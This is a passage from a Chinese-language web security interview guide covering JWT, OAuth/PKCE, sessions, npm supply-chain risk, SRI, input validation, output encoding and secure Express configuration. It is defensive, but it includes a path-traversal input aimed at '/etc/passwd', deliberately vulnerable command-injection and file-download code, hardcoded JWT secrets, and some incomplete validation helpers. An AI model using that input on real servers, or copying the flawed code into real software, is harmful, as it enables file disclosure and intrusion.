// 每个域名: 20-50 个 Cookie（浏览器不同）
// 总大小: 4KB * 20 = 80KB

// 5. 清除 Cookie
res.clearCookie('sessionId', {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});

// 6. 子域名共享
// 主域名设置
res.cookie('sharedData', data, {
  domain: '.example.com' // 子域名都可访问
});

// 7. 前端读取 Cookie
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) {
    return parts.pop().split(';').shift();
  }
}

// 8. 前端设置 Cookie
document.cookie = 'theme=dark; max-age=31536000; path=/; secure; samesite=lax';

// 9. 第三方 Cookie（正在被淘汰）
// Chrome 逐步禁用第三方 Cookie
// 替代方案：First-Party Sets、Storage Access API
```

---

## 9. 认证与授权

### 9.1 JWT (JSON Web Token)

```javascript
// JWT 结构: Header.Payload.Signature

// Header（算法和类型）
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload（数据）
{
  "sub": "user123",
  "name": "John Doe",
  "iat": 1516239022,
  "exp": 1516242622
}

// Signature（签名）
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)

// 生成 JWT
const jwt = require('jsonwebtoken');

const token = jwt.sign(
  { userId: '123', role: 'admin' },
  'secret-key',
  { expiresIn: '1h' }
);

// 验证 JWT
try {
  const decoded = jwt.verify(token, 'secret-key');
  console.log(decoded); // { userId: '123', role: 'admin', iat: ..., exp: ... }
} catch (err) {
  console.error('Invalid token');
}

// JWT 使用（前端）
// 1. 登录获取 token
const response = await fetch('/login', {
  method: 'POST',
  body: JSON.stringify({ username, password })
});
const { token } = await response.json();
localStorage.setItem('token', token);

// 2. 请求时携带 token
fetch('/api/data', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('token')}`
  }
});

// 3. Token 刷新
async function refreshToken() {
  const response = await fetch('/refresh', {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${localStorage.getItem('refreshToken')}`
    }
  });
  const { token } = await response.json();
  localStorage.setItem('token', token);
}

// 4. 自动刷新（拦截器）
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response.status === 401) {
      await refreshToken();
      // 重试原请求
      return axios(error.config);
    }
    return Promise.reject(error);
  }
);

// JWT 安全注意事项：
// • 不要存储敏感信息（Payload 是 Base64，可解码）
// • 使用 HTTPS
// • 设置合理的过期时间
// • 使用 HttpOnly Cookie 存储（更安全）
// • 后端验证签名
// • 使用 RS256（非对称加密）而不是 HS256（生产环境）
```

### 9.2 OAuth 2.0

```javascript
// OAuth 2.0 授权码流程

// 1. 跳转到授权服务器
const authUrl = `https://oauth.example.com/authorize?` +
  `response_type=code&` +
  `client_id=${clientId}&` +
  `redirect_uri=${encodeURIComponent(redirectUri)}&` +
  `scope=read write&` +
  `state=${state}`; // CSRF 防护

window.location.href = authUrl;

// 2. 用户授权后，重定向回应用
// https://yourapp.com/callback?code=abc123&state=xyz

// 3. 验证 state（防止 CSRF）
const urlParams = new URLSearchParams(location.search);
const code = urlParams.get('code');
const state = urlParams.get('state');

if (state !== sessionStorage.getItem('oauthState')) {
  throw new Error('Invalid state');
}

// 4. 用 code 换取 access_token
const response = await fetch('https://oauth.example.com/token', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code: code,
    redirect_uri: redirectUri,
    client_id: clientId,
    client_secret: clientSecret // 后端发送，前端不能有
  })
});

const { access_token, refresh_token } = await response.json();

// 5. 使用 access_token 访问资源
fetch('https://api.example.com/user', {
  headers: {
    'Authorization': `Bearer ${access_token}`
  }
});

// 6. Token 过期后用 refresh_token 刷新
fetch('https://oauth.example.com/token', {
  method: 'POST',
  body: new URLSearchParams({
    grant_type: 'refresh_token',
    refresh_token: refresh_token,
    client_id: clientId,
    client_secret: clientSecret
  })
});

// PKCE 扩展（适用于 SPA）
// 无需 client_secret

// 1. 生成 code_verifier
const codeVerifier = base64URLEncode(crypto.getRandomValues(new Uint8Array(32)));

// 2. 生成 code_challenge
const encoder = new TextEncoder();
const data = encoder.encode(codeVerifier);
const hash = await crypto.subtle.digest('SHA-256', data);
const codeChallenge = base64URLEncode(new Uint8Array(hash));

// 3. 授权请求
const authUrl = `https://oauth.example.com/authorize?` +
  `response_type=code&` +
  `client_id=${clientId}&` +
  `redirect_uri=${redirectUri}&` +
  `code_challenge=${codeChallenge}&` +
  `code_challenge_method=S256`;

// 4. 换取 token 时携带 code_verifier
fetch('https://oauth.example.com/token', {
  method: 'POST',
  body: new URLSearchParams({
    grant_type: 'authorization_code',
    code: code,
    redirect_uri: redirectUri,
    client_id: clientId,
    code_verifier: codeVerifier // 无需 client_secret
  })
});
```

### 9.3 Session vs Token

```javascript
// Session（传统方式）

// 服务器存储
const sessions = new Map();

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  if (验证通过) {
    const sessionId = crypto.randomUUID();
    sessions.set(sessionId, { userId: '123', username });
    
    res.cookie('sessionId', sessionId, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict'
    });
    
    res.json({ success: true });
  }
});

app.get('/api/data', (req, res) => {
  const sessionId = req.cookies.sessionId;
  const session = sessions.get(sessionId);
  
  if (!session) {
    return res.status(401).send('Unauthorized');
  }
  
  res.json({ data: '...' });
});

// Token（现代方式）

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  if (验证通过) {
    const token = jwt.sign({ userId: '123' }, 'secret-key', { expiresIn: '1h' });
    res.json({ token });
  }
});

app.get('/api/data', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  try {
    const decoded = jwt.verify(token, 'secret-key');
    res.json({ data: '...' });
  } catch (err) {
    res.status(401).send('Unauthorized');
  }
});

// 对比：

// Session:
// ✅ 服务器控制，可随时吊销
// ✅ 不暴露用户信息
// ❌ 占用服务器内存
// ❌ 分布式环境需要共享 Session
// ❌ CSRF 风险

// Token:
// ✅ 无状态，易于扩展
// ✅ 跨域友好
// ✅ 适合微服务
// ❌ 无法主动吊销（需要黑名单）
// ❌ Payload 可被解码（不能存敏感信息）
// ❌ Token 被盗风险（需要短期 + 刷新机制）

// 混合方案（推荐）
// Access Token（短期，15 分钟）+ Refresh Token（长期，7 天，HttpOnly Cookie）
```

---

## 10. 依赖安全

### 10.1 npm 安全

```bash
# 1. 检查已知漏洞
npm audit

# 2. 自动修复
npm audit fix

# 3. 强制修复（可能破坏兼容性）
npm audit fix --force

# 4. 查看详细报告
npm audit --json

# 5. 安装时检查
npm install --audit

# 6. 使用 npm ci 而不是 npm install
# 严格按照 package-lock.json 安装
npm ci

# 7. 定期更新依赖
npm outdated
npm update

# 8. 锁定版本
# package.json
{
  "dependencies": {
    "express": "4.18.2"  // 精确版本，不使用 ^ 或 ~
  }
}

# 9. 使用 Snyk
npm install -g snyk
snyk test
snyk monitor

# 10. 检查许可证
npx license-checker
```

### 10.2 依赖风险

```javascript
// 1. 供应链攻击
// 案例：event-stream 事件（2018）
// 攻击者获得 npm 包维护权，注入恶意代码

// 防御：
// • 定期审查依赖
// • 使用 lock 文件
// • 监控异常行为

// 2. 依赖混淆攻击
// 攻击者发布与内部包同名的公共包

// 防御：
// • 使用私有 npm registry
// • 配置 .npmrc
@mycompany:registry=https://npm.mycompany.com

// 3. Typosquatting（拼写劫持）
// 攻击者发布名称相似的恶意包
// 例如：express → expres、expross

// 防御：
// • 仔细检查包名
// • 使用官方文档推荐的包
// • 检查包的下载量、维护者

// 4. 过时的依赖
// 使用有已知漏洞的旧版本

// 防御：
// • Dependabot（GitHub）
// • Renovate Bot
// • npm outdated

// 5. 依赖过多
// 增加攻击面

// 防御：
// • 定期清理无用依赖
// • 使用 depcheck
npx depcheck

// 6. 代码审查工具
// • GitHub Security Advisories
// • Snyk
// • npm audit
// • OWASP Dependency-Check
```

### 10.3 Subresource Integrity (SRI)

```html
<!-- CDN 资源完整性校验 -->

<!-- 1. 生成 SRI hash -->
<!-- 
openssl dgst -sha384 -binary script.js | openssl base64 -A
-->

<!-- 2. 使用 SRI -->
<script 
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
  crossorigin="anonymous"
></script>

<!-- 3. 多个 hash（备用） -->
<script 
  src="https://cdn.example.com/library.js"
  integrity="sha384-... sha512-..."
  crossorigin="anonymous"
></script>

<!-- 4. CSS -->
<link 
  rel="stylesheet"
  href="https://cdn.example.com/style.css"
  integrity="sha384-..."
  crossorigin="anonymous"
>

<!-- 5. 自动生成 SRI -->
<!-- webpack-subresource-integrity 插件 -->
```

---

## 11. 安全编码实践

### 11.1 输入验证

```javascript
// 1. 白名单验证（推荐）
function validateEmail(email) {
  const pattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  return pattern.test(email);
}

function validatePhone(phone) {
  const pattern = /^1[3-9]\d{9}$/; // 中国手机号
  return pattern.test(phone);
}

// 2. 类型检查
function validateAge(age) {
  const numAge = Number(age);
  return Number.isInteger(numAge) && numAge >= 0 && numAge <= 150;
}

// 3. 长度限制
function validateUsername(username) {
  return typeof username === 'string' && 
         username.length >= 3 && 
         username.length <= 20 &&
         /^[a-zA-Z0-9_]+$/.test(username);
}

// 4. 文件上传验证
function validateFile(file) {
  // 检查文件类型
  const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
  if (!allowedTypes.includes(file.type)) {
    throw new Error('Invalid file type');
  }
  
  // 检查文件大小（5MB）
  const maxSize = 5 * 1024 * 1024;
  if (file.size > maxSize) {
    throw new Error('File too large');
  }
  
  // 检查文件扩展名
  const ext = file.name.split('.').pop().toLowerCase();
  if (!['jpg', 'jpeg', 'png', 'gif'].includes(ext)) {
    throw new Error('Invalid file extension');
  }
  
  return true;
}

// 5. URL 验证
function validateURL(url) {
  try {
    const parsed = new URL(url);
    // 只允许 HTTP(S) 协议
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      return false;
    }
    // 禁止访问内网
    const ip = parsed.hostname;
    if (
      ip.startsWith('127.') ||
      ip.startsWith('192.168.') ||
      ip.startsWith('10.') ||
      ip === 'localhost'
    ) {
      return false;
    }
    return true;
  } catch {
    return false;
  }
}

// 6. 使用验证库
import validator from 'validator';

validator.isEmail('test@example.com'); // true
validator.isURL('https://example.com'); // true
validator.isMobilePhone('+8613800138000', 'zh-CN'); // true
validator.isStrongPassword('P@ssw0rd123'); // true

// 7. 服务端验证（必须）
// 前端验证只是 UX，真正的验证在后端
app.post('/api/register', (req, res) => {
  const { username, email, password } = req.body;
  
  // 验证所有输入
  if (!validateUsername(username)) {
    return res.status(400).json({ error: 'Invalid username' });
  }
  
  if (!validator.isEmail(email)) {
    return res.status(400).json({ error: 'Invalid email' });
  }
  
  if (!validator.isStrongPassword(password)) {
    return res.status(400).json({ error: 'Weak password' });
  }
  
  // 处理注册
});
```

### 11.2 输出编码

```javascript
// 1. HTML 编码
function encodeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

// 或
function encodeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// 2. JavaScript 编码
function encodeJS(str) {
  return str.replace(/[\\"']/g, '\\$&').replace(/ /g, '\\0');
}

// 3. URL 编码
const encoded = encodeURIComponent(userInput);
const url = `https://example.com/search?q=${encoded}`;

// 4. CSS 编码
function encodeCSS(str) {
  return str.replace(/[<>"']/g, (char) => {
    return '\\' + char.charCodeAt(0).toString(16) + ' ';
  });
}

// 5. JSON 编码
const json = JSON.stringify(data);
// 防止 XSS
const safeJson = json
  .replace(/</g, '\\u003c')
  .replace(/>/g, '\\u003e');

// 6. 富文本编码
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(richText);
```

### 11.3 错误处理

```javascript
// 1. 不暴露敏感信息
// 错误
app.get('/api/user/:id', (req, res) => {
  try {
    const user = db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);
    res.json(user);
  } catch (err) {
    res.status(500).send(err.message); // 暴露 SQL 错误
  }
});

// 正确
app.get('/api/user/:id', (req, res) => {
  try {
    const user = db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);
    res.json(user);
  } catch (err) {
    console.error(err); // 记录到日志
    res.status(500).send('服务器错误，请稍后重试');
  }
});

// 2. 统一错误处理
app.use((err, req, res, next) => {
  // 记录详细错误
  console.error({
    message: err.message,
    stack: err.stack,
    url: req.url,
    method: req.method,
    ip: req.ip,
    timestamp: new Date()
  });
  
  // 返回通用错误
  res.status(500).json({
    error: '服务器错误',
    requestId: req.id // 用于追踪
  });
});

// 3. 前端错误处理
window.onerror = (message, source, lineno, colno, error) => {
  // 上报错误
  fetch('/api/log-error', {
    method: 'POST',
    body: JSON.stringify({
      message,
      source,
      lineno,
      colno,
      stack: error?.stack,
      userAgent: navigator.userAgent
    })
  });
};

// 4. Promise 错误
window.addEventListener('unhandledrejection', (event) => {
  console.error('Unhandled rejection:', event.reason);
  // 上报
});

// 5. React Error Boundary
class ErrorBoundary extends React.Component {
  state = { hasError: false };
  
  static getDerivedStateFromError(error) {
    return { hasError: true };
  }
  
  componentDidCatch(error, errorInfo) {
    console.error(error, errorInfo);
    // 上报
  }
  
  render() {
    if (this.state.hasError) {
      return <h1>出错了，请刷新页面</h1>;
    }
    return this.props.children;
  }
}
```

### 11.4 安全配置

```javascript
// 1. Helmet.js（Express 安全头）
const helmet = require('helmet');
app.use(helmet());

// 等价于：
app.use(helmet.contentSecurityPolicy());
app.use(helmet.dnsPrefetchControl());
app.use(helmet.frameguard());
app.use(helmet.hidePoweredBy());
app.use(helmet.hsts());
app.use(helmet.ieNoOpen());
app.use(helmet.noSniff());
app.use(helmet.permittedCrossDomainPolicies());
app.use(helmet.referrerPolicy());
app.use(helmet.xssFilter());

// 2. CORS 配置
const cors = require('cors');

app.use(cors({
  origin: 'https://example.com', // 指定来源
  credentials: true, // 允许携带 Cookie
  methods: ['GET', 'POST'], // 允许的方法
  allowedHeaders: ['Content-Type', 'Authorization'], // 允许的头部
  maxAge: 86400 // 预检请求缓存时间
}));

// 3. 速率限制
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 分钟
  max: 100, // 最多 100 个请求
  message: '请求过于频繁，请稍后再试'
});

app.use('/api/', limiter);

// 4. SQL 防注入
// 使用参数化查询
const result = await db.query('SELECT * FROM users WHERE id = ?', [userId]);

// 5. 命令注入防御
// 错误：直接拼接
const { exec } = require('child_process');
exec(`ls ${userInput}`); // 危险

// 正确：使用 execFile + 参数数组
const { execFile } = require('child_process');
execFile('ls', [userInput], (err, stdout) => {
  console.log(stdout);
});

// 6. 路径遍历防御
const path = require('path');

// 错误
app.get('/download', (req, res) => {
  res.sendFile(`./files/${req.query.filename}`);
});
// 攻击：?filename=../../etc/passwd

// 正确
app.get('/download', (req, res) => {
  const filename = path.basename(req.query.filename); // 只取文件名
  const filepath = path.join(__dirname, 'files', filename);
  
  // 确保在允许的目录内
  if (!filepath.startsWith(path.join(__dirname, 'files'))) {
    return res.status(403).send('Forbidden');
  }
  
  res.sendFile(filepath);
});

// 7. XXE（XML 外部实体）防御
const libxmljs = require('libxmljs');

const xml = libxmljs.parseXml(xmlString, {
  noent: false, // 禁用实体解析
  nonet: true   // 禁用网络访问
});
```

---

## 12. 经典面试题

### Q1: 如何防御 XSS 攻击？

```
1. 输出转义（最重要）
   • 使用 textContent 而不是 innerHTML
   • HTML 实体编码
   • 使用 DOMPurify 库

2. CSP（Content Security Policy）
   • 限制资源加载来源
   • 使用 nonce 或 hash

3. HttpOnly Cookie
   • 防止 JavaScript 访问敏感 Cookie

4. 输入验证
   • 白名单验证
   • 过滤危险字符

5. 框架自动转义
   • React、Vue 默认转义

6. X-XSS-Protection 头部（已过时）
```

### Q2: CSRF 和 XSS 的区别？

见 1.1、2.1、2.3 节

### Q3: JWT 存储在哪里最安全？

```
三种方案：

1. LocalStorage
   ✅ 简单易用
   ❌ XSS 攻击可窃取
   ❌ 跨标签页共享（安全风险）

2. SessionStorage
   ✅ 标签页隔离
   ❌ XSS 攻击可窃取
   ❌ 刷新后需重新登录（体验差）

3. HttpOnly Cookie（推荐）
   ✅ 防御 XSS
   ✅ 自动发送
   ❌ CSRF 风险（需配合 SameSite）

推荐方案：
• Access Token: HttpOnly Cookie + SameSite=Strict
• Refresh Token: HttpOnly Cookie + path=/api/refresh
• 使用 HTTPS
```

### Q4: 如何防御点击劫持？

见 3.2 节

### Q5: HTTPS 是如何保证安全的？

见 6.1 节

### Q6: 前端密码应该如何传输？

```
推荐方案：HTTPS + 明文传输

原因：
• HTTPS 已经加密了传输层
• 额外加密反而增加复杂度
• 前端加密无法防御中间人攻击（公钥可被替换）

额外防护（可选）：
• RSA 加密密码（防御不信任网络）
• 后端使用 bcrypt 哈希存储

错误方案：
• 客户端哈希后传输（哈希值可被重放攻击）
```

### Q7: 如何防御 SQL 注入？

见 4.2 节

### Q8: CSP 如何工作？

见 7.1-7.3 节

### Q9: 同源策略是什么？

```
同源策略（Same-Origin Policy）：

定义：
协议 + 域名 + 端口 必须完全相同

限制：
• 无法读取 Cookie、LocalStorage、IndexedDB
• 无法操作 DOM
• 无法发送 AJAX 请求（会发送，但无法读取响应）

例外：
• <script>、<img>、<link> 等标签可以跨域加载
• <iframe> 可以跨域嵌入（但无法访问内容）
• postMessage 可以跨域通信

绕过方案：
• CORS
• JSONP
• Proxy
• postMessage
```

### Q10: 如何检测网站是否存在安全漏洞？

```
工具：
• OWASP ZAP
• Burp Suite
• Nikto
• Snyk
• npm audit
• GitHub Security Advisories

检查项：
1. XSS: 尝试注入脚本
2. CSRF: 检查是否有 Token
3. SQL 注入: 尝试特殊字符
4. 敏感信息泄露: 检查响应头、错误信息
5. 弱密码: 尝试常见密码
6. 过时的依赖: npm audit
7. 缺少安全头部: Helmet.js
8. 点击劫持: 检查 X-Frame-Options
9. 混合内容: HTTPS 页面加载 HTTP 资源
10. 开放端口: nmap 扫描

自动化：
• CI/CD 集成安全扫描
• Dependabot
• Snyk Monitor
• SAST（静态分析）
• DAST（动态分析）
```

---

## 面试技巧

### 答题思路
1. **攻击原理**：如何攻击 → 危害 → 实际案例
2. **防御方案**：多层防御 → 最佳实践 → 工具推荐
3. **权衡取舍**：安全 vs 性能 vs 用户体验

### 常见陷阱
1. 只依赖前端验证（前端可绕过）
2. 明文存储密码（必须哈希 + 盐）
3. JWT 存储在 LocalStorage（XSS 风险）
4. 忽略 HTTPS（中间人攻击）
5. 过度信任用户输入（永远不信任）

### 加分项
1. 了解 OWASP Top 10
2. 有安全漏洞修复经验
3. 熟悉安全工具（Snyk、ZAP）
4. 关注最新安全事件
5. 有安全编码规范意识

---

**安全原则**：
1. **最小权限原则**：只给必要权限
2. **纵深防御**：多层防御，不依赖单点
3. **默认拒绝**：白名单 > 黑名单
4. **失败安全**：系统故障时保持安全状态
5. **不信任用户输入**：永远验证和转义
